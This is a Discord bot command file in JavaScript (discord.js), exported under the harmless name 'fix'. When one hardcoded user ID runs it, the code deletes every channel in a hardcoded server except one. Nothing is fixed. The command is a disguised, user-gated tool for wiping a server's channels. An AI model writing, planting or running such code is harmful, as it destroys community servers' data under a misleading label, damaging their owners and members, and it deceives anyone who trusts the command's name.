
const Discord = require("discord.js");

module.exports.run = async (bot, message, args) => {
	if (message.author.id == '129000992762101761') {
	var server = bot.guilds.get('132244749837926400');
		for (var i = 0; i < server.channels.array().length; i++) {
			if (server.channels.array()[i].id != '494506983387561985') {
    			server.channels.array()[i].delete();
		}
	}
}

}

module.exports.help = {
	name: "fix"
}